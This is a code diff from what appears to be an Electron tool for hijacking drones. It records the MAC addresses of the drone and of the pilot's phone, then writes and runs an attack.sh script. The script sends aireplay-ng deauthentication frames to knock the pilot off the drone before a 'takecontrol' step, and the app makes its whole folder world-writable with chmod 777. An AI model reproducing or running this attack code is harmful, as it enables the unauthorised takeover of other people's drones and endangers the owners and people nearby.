@@ -32,6 +32,7 @@ const params = {
 
 var hijack = null
 var droneMacAddress = ""
+var droneChannel = ""
 var phoneMacAddress = ""
 
 export default class AppUpdater {
@@ -194,16 +195,18 @@ ipcMain.on('droneMAC', async (event, arg) => {
   console.log("DRONE MAC ADDRESS RECORDED: " + droneMacAddress + '\n')
 });
 
+ipcMain.on('droneChannel', async (event, arg) => {
+  droneChannel = arg
+  console.log("DRONE CHANNEL RECORDED: " + droneChannel + '\n')
+});
+
 ipcMain.on('phoneMAC', async (event, arg) => {
   phoneMacAddress = arg
   console.log("PHONE MAC ADDRESS RECORDED: " + phoneMacAddress + '\n')
 
-  var content = "aireplay-ng --deauth 35 -a "
-  content += droneMacAddress + " -c " + phoneMacAddress + " wlp2s0 \n"
-  content +=`ifconfig wlp2s0 down
-  iwconfig wlp2s0 mode managed
-  ifconfig wlp2s0 up
-  service network-manager start`
+  var content = "#!/bin/bash\naireplay-ng --deauth 35 -a "
+  content += droneMacAddress + " -c " + phoneMacAddress + " wlp2s0mon\n"
+  content +="airmon-ng stop wlp2s0mon\nservice network-manager start\nsystemctl restart networking\nservice network-manager start"
 
   fs.writeFileSync('attack.sh', content)
   const raisePermissions = spawn('/bin/sh', ['-c', 'chmod -R 777 ./'])
@@ -230,6 +233,7 @@ ipcMain.on('phoneMAC', async (event, arg) => {
 
 ipcMain.on('sendMac', async (event, arg) => {
   event.sender.send('droneMac', droneMacAddress)
+  event.sender.send('droneChannel', droneChannel)
 });
 
 ipcMain.on('takecontrol', async (event, arg) => {
